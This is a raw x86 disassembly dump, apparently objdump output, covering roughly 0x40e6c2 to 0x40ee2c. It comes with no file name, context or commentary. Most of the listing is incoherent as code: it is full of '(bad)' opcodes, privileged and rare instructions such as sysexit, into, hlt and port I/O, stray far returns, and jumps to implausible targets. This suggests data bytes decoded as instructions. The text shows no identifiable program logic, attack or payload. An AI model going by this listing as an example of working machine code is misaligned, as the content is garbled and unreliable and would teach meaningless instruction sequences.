  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
